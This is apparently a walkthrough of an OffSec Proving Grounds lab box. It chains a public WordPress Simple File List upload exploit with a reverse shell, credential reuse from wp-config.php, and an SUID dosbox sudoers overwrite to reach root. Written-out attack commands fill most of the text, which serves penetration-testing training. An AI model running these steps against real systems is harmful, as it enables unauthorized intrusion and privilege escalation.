# Nukem — OffSec Proving Grounds Walkthrough

**Platform:** Proving Grounds Practice
**Difficulty:** Intermediate
**OS:** Linux

---

## TL;DR

WordPress 5.5.1 with vulnerable Simple File List 4.2.2 plugin → file upload RCE → wp-config.php credentials → SSH as commander → SUID `dosbox` to overwrite sudoers → root.

---

## Enumeration

```bash
sudo nmap -sC -p- -n -Pn -sV --min-rate=9362 192.168.240.105 -oN nmap.txt
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 8.3 |
| 80 | HTTP | Apache 2.4.46 (WordPress 5.5.1) |
| 3306 | MySQL | MariaDB (remote blocked) |
| 5000 | HTTP | Werkzeug 1.0.1 (Python) |
| 36445 | SMB | Samba 4.6.2 |

WordPress site with full WPScan revealing a vulnerable plugin: **Simple File List 4.2.2**.

---

## Exploitation — Simple File List File Upload RCE

Using [EDB-48979](https://www.exploit-db.com/exploits/48979), the stock exploit doesn't work — we need to replace the default payload with the **PHP Ivan Sincek reverse shell**:

```bash
python3 48979.py http://192.168.240.105/
```

Shell caught. Enumerate to find WordPress config:

```bash
cat /srv/http/wp-config.php
```

```php
define('DB_USER', 'commander');
define('DB_PASSWORD', 'CommanderKeenVorticons1990');
```

SSH in:

```bash
ssh commander@192.168.240.105
# Password: CommanderKeenVorticons1990
```

---

## Privilege Escalation — SUID dosbox

Enumerating SUID binaries, we find **dosbox** with the SUID bit set.

dosbox can mount the filesystem and write files — including `/etc/sudoers`:

```bash
LFILE='/etc/sudoers'
dosbox -c 'mount c /' -c "echo commander ALL=(ALL:ALL) ALL >c:$LFILE" -c exit
```

Now:

```bash
sudo su
```

**Root.** 🎉

---

## Key Takeaways

- **WordPress plugin vulnerabilities** are the #1 attack vector for WP sites — `wpscan --enumerate ap --plugins-detection aggressive` is essential
- **Simple File List** file upload exploit may need payload modification — use a proven PHP reverse shell
- **SUID `dosbox`** is a rare but devastating misconfiguration — it can mount the entire filesystem and write arbitrary files
- Always check `wp-config.php` for database credentials that might be reused for SSH

---

*Thanks for reading! Follow for more OffSec walkthrough content.*
